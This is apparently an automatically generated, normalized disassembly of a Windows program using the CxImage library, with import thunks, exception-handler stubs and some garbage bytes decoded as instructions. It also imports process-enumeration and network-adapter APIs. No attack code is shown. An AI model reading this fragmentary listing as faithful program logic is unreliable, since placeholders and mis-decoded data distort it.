jmp [ mbstowcs@IAT ]
wcslen
jmp [ wcslen@IAT ]
sub_419238
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
jmp [ _purecall@IAT ]
_chkesp
jmp [ _chkesp@IAT ]
sub_4192b8
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4192d0
sub_41930c
push [ ebp - 0x14 ]
call sub_41932e
pop ecx
retn
sub_41932e
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp ?terminate@@YAXXZ
xor eax eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_41934a
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
sin
jmp [ sin@IAT ]
cos
jmp [ cos@IAT ]
acos
jmp [ acos@IAT ]
fabs
jmp [ fabs@IAT ]
_setjmp3
jmp [ _setjmp3@IAT ]
__CxxLongjmpUnwind
jmp [ __CxxLongjmpUnwind@IAT ]
exp
jmp [ exp@IAT ]
log
jmp [ log@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4193ae
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4193c0
xor eax eax
retn
sub_4193c3
retn
_except_handler3
jmp [ _except_handler3@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
GetAdaptersInfo
jmp [ GetAdaptersInfo@IAT ]
GetModuleBaseNameA
jmp [ GetModuleBaseNameA@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
EnumProcesses
jmp [ EnumProcesses@IAT ]
GetModuleFileNameExA
jmp [ GetModuleFileNameExA@IAT ]
sub_41976c
add eax [ ebx ]
add eax [ ebx ]
add al 0x3
int3
sub_42b360
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4318b0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
_strdup
jmp [ _strdup@IAT ]
_stat
jmp [ _stat@IAT ]
_itoa
jmp [ _itoa@IAT ]
sub_434bb0
mov ecx [ ebp - 0x10 ]
call ??1CxFile@@UAE@XZ
retn
sub_434bb9
mov eax r--data
jmp __CxxFrameHandler
sub_434bd0
mov ecx [ ebp - 0x10 ]
call ??1CxFile@@UAE@XZ
retn
sub_434bd9
mov eax r--data
jmp __CxxFrameHandler
sub_434bf0
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
retn
sub_434bf9
mov eax r--data
jmp __CxxFrameHandler
sub_434c10
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
retn
sub_434c19
mov eax r--data
jmp __CxxFrameHandler
sub_434c30
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
retn
sub_434c39
mov eax r--data
jmp __CxxFrameHandler
sub_434c50
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
retn
sub_434c59
mov eax r--data
jmp __CxxFrameHandler
sub_434c70
lea ecx [ ebp - 0x28 ]
call ??1CxMemFile@@UAE@XZ
retn
sub_434c79
mov eax r--data
jmp __CxxFrameHandler
sub_434c90
lea ecx [ ebp - 0x684 ]
call ??1CxImageJPG@@UAE@XZ
retn
sub_434c9c
mov eax r--data
jmp __CxxFrameHandler
sub_434cb0
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
retn
sub_434cb9
mov eax r--data
jmp __CxxFrameHandler
sub_434cd0
lea ecx [ ebp - 0x1cc ]
call ??1CxImage@@UAE@XZ
retn
sub_434cdc
lea ecx [ ebp - 0x388 ]
call ??1CxImage@@UAE@XZ
retn
sub_434ce8
mov eax r--data
jmp __CxxFrameHandler
sub_434d00
lea ecx [ ebp - 0x240 ]
call ??1CxImage@@UAE@XZ
retn
sub_434d0c
mov eax r--data
jmp __CxxFrameHandler
sub_434d20
lea ecx [ ebp - 0x1d8 ]
call ??1CxImage@@UAE@XZ
retn
sub_434d2c
mov eax r--data
jmp __CxxFrameHandler
sub_434d40
lea ecx [ ebp - 0x1d0 ]
call ??1CxImage@@UAE@XZ
retn
sub_434d4c
mov eax r--data
jmp __CxxFrameHandler
sub_434d60
lea ecx [ ebp - 0x218 ]
call sub_4177c0
retn
sub_434d6c
mov eax r--data
jmp __CxxFrameHandler
sub_434d80
lea ecx [ ebp - 0x2e8 ]
call sub_415780
retn
sub_434d8c
mov eax r--data
jmp __CxxFrameHandler
sub_434da0
lea ecx [ ebp - 0x284 ]
call sub_415780
retn
sub_434dac
mov eax r--data
jmp __CxxFrameHandler
